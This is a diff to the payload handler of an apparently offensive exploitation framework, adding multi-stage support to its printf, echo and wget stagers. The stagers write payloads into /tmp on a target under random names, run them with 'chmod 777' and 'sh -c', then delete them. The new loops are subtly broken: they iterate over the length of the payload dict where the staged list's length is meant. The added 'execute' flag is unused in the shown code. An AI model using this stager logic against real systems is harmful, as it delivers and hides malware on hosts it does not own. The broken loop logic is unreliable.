@@ -69,7 +69,7 @@ class Handler(TCP):
             byte_octals.append(byte_octal)
         return ''.join(byte_octals)
 
-    def wget_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
+    def wget_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False, execute=True):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
@@ -98,7 +98,7 @@ class Handler(TCP):
             sender(*args, {command})
         requests.delete(wget_container)
 
-    def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
+    def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False, execute=True):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
@@ -128,7 +128,7 @@ class Handler(TCP):
             else:
                 sender(*args, f"chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
     
-    def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
+    def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False, execute=True):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
@@ -175,14 +175,34 @@ class Handler(TCP):
             session = payload['Session'] if payload['Session'] is not None else HatSploitSession
             if payload['Category'].lower() == 'stager':
                 if post.lower() == 'printf':
-                    self.printf_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
+                    if isinstance(payload['Payload'], list):
+                        for stage in range(len(payload)-1):
+                            self.printf_stage(payload['Payload'][stage], sender, args, None, delim, location, encode, False)
+                        self.printf_stage(payload['Payload'][-1], sender, args, payload['Args'], delim, location, encode)
+                    else:
+                        self.printf_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
                 elif post.lower() == 'echo':
-                    self.echo_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
+                    if isinstance(payload['Payload'], list):
+                        for stage in range(len(payload)-1):
+                            self.echo_stage(payload['Payload'][stage], sender, args, None, delim, location, encode, False)
+                        self.echo_stage(payload['Payload'][-1], sender, args, payload['Args'], delim, location, encode)
+                    else:
+                        self.echo_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
                 elif post.lower() == 'wget':
-                    self.wget_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
+                    if isinstance(payload['Payload'], list):
+                        for stage in range(len(payload)-1):
+                            self.wget_stage(payload['Payload'][stage], sender, args, None, delim, location, encode, False)
+                        self.wget_stage(payload['Payload'][-1], sender, args, payload['Args'], delim, location, encode)
+                    else:
+                        self.wget_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
                 else:
                     self.output_warning("Invalid post method, using printf by default.")
-                    self.printf_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
+                    if isinstance(payload['Payload'], list):
+                        for stage in range(len(payload)-1):
+                            self.printf_stage(payload['Payload'][stage], sender, args, None, delim, location, encode, False)
+                        self.printf_stage(payload['Payload'][-1], sender, args, payload['Args'], delim, location, encode)
+                    else:
+                        self.printf_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
             elif payload['Category'].lower() == 'single':
                 sender(*args, payload['Payload'])
             else:
@@ -204,14 +224,34 @@ class Handler(TCP):
 
                 if payload['Category'].lower() == 'stager':
                     if post.lower() == 'printf':
-                        self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
+                        if isinstance(payload['Payload'], list):
+                            for stage in range(len(payload)-1):
+                                self.printf_stage(payload['Payload'][stage], new_session.send, args, None, delim, location, encode, False)
+                            self.printf_stage(payload['Payload'][-1], new_session.send, args, payload['Args'], delim, location, encode)
+                        else:
+                            self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
                     elif post.lower() == 'echo':
-                        self.echo_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
+                        if isinstance(payload['Payload'], list):
+                            for stage in range(len(payload)-1):
+                                self.echo_stage(payload['Payload'][stage], new_session.send, args, None, delim, location, encode, False)
+                            self.echo_stage(payload['Payload'][-1], new_session.send, args, payload['Args'], delim, location, encode)
+                        else:
+                            self.echo_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
                     elif post.lower() == 'wget':
-                        self.wget_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
+                        if isinstance(payload['Payload'], list):
+                            for stage in range(len(payload)-1):
+                                self.wget_stage(payload['Payload'][stage], new_session.send, args, None, delim, location, encode, False)
+                            self.wget_stage(payload['Payload'][-1], new_session.send, args, payload['Args'], delim, location, encode)
+                        else:
+                            self.wget_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
                     else:
                         self.output_warning("Invalid post method, using printf by default.")
-                        self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
+                        if isinstance(payload['Payload'], list):
+                            for stage in range(len(payload)-1):
+                                self.printf_stage(payload['Payload'][stage], new_session.send, args, None, delim, location, encode, False)
+                            self.printf_stage(payload['Payload'][-1], new_session.send, args, payload['Args'], delim, location, encode)
+                        else:
+                            self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
                 elif payload['Category'].lower() == 'single':
                     new_session.send_command(payload['Payload'])
                 else:
